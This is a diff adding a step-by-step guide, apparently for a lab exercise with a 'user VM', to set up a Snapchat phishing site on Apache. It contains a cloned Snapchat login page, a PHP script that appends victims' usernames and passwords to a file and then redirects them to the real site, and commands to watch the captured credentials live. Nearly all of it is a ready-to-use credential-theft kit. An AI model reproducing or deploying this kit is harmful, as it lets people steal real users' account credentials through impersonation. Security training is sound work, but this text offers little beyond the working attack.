@@ -1,0 +1,82 @@
+sudo apt update
+
+sudo apt install apache2 -y
+
+sudo mkdir /var/www/html/snapchat-phish
+
+sudo nano /var/www/html/snapchat-phish/index.html
+
+(THIS IS THE CODE TO INPUT HERE) (CUSTOMIZED CODE SPECIFICALLY FOR SNAPCHAT LOGIN PAGE) 
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Log In - Snapchat</title>
+<link rel="shortcut icon" type="image/png" href="https://accounts.snapchat.com/favicon.ico"/>
+<link href="https://fonts.googleapis.com/css?family=Open+Sans:400,300" rel="stylesheet" type="text/css">
+<style>
+    body { margin:0px; font-family: Helvetica, Arial, sans-serif; background-color: #262626; color:#fff; }
+    .inputBox { width:304px; height:38px; margin-bottom:15px; font-size:14px; }
+    button { background-color: #fffc01; color: #262626; width:304px; height:38px; font-weight: 700; }
+ </style>
+<body>
+    <center>
+    <img src="https://accounts.snapchat.com/accounts/static/images/ghost/ghost.svg" style="width:36px;padding-top:80px;padding-bottom:95px;">
+    <font size="48px;"><br>Log In</font><br>
+    <form action="capture.php" method="post">
+        <input class="inputBox" id="username" name="username" type="text" placeholder="Username" required><br>
+        <input class="inputBox" id="password" name="password" type="password" placeholder="Password" required><br>
+        <button type="submit">LOG IN</button>
+    </form>
+    <a href="https://accounts.snapchat.com/accounts/password_reset_request">Forgot your password?</a>
+    </center>
+</body>
+
+sudo nano /var/www/html/snapchat-phish/capture.php
+
+(THIS IS THE CODE TO INPUT HERE) (CUSTOMIZED CODE SPECIFICALLY FOR LOGIN PAGE) 
+
+<?php
+$username = $_POST['username'];
+$password = $_POST['password'];
+$file = fopen("credentials.txt", "a");
+fwrite($file, "Username: " . $username . " | Password: " . $password . "\n");
+fclose($file);
+header('Location: https://accounts.snapchat.com'); // Redirect to Snapchat's real login page
+exit();
+?>
+
+sudo chmod -R 755 /var/www/html/snapchat-phish
+
+(THE DEFAULT APACHE PAGE NEEDS TO BE REMOVED TO ENSURE ONLY THE PHISHING PAGE LOADS)
+sudo rm /var/www/html/index.nginx-debian.html
+
+cat /var/www/html/snapchat-phish/credentials.txt
+
+sudo tail -f /var/www/html/snapchat-phish/credentials.txt
+
+(On the user VM, do http://attacker_IP/snapchat-phish/index.html) (Or just even input attacker_IP into user VM)
+
+(QUICK SUMMARY)
+# 1. Install Apache
+sudo apt update
+sudo apt install apache2 -y
+
+# 2. Create phishing directory
+sudo mkdir /var/www/html/snapchat-phish
+
+# 3. Create index.html for the Snapchat login page
+sudo nano /var/www/html/snapchat-phish/index.html
+
+# 4. Create capture.php to log credentials
+sudo nano /var/www/html/snapchat-phish/capture.php
+
+# 5. Set permissions
+sudo chmod -R 755 /var/www/html/snapchat-phish
+
+# 6. Remove default Apache page
+sudo rm /var/www/html/index.nginx-debian.html
+
+# 7. View captured credentials
+cat /var/www/html/snapchat-phish/credentials.txt
+
+# 8. Optional: Monitor credentials in real-time
+sudo tail -f /var/www/html/snapchat-phish/credentials.txt
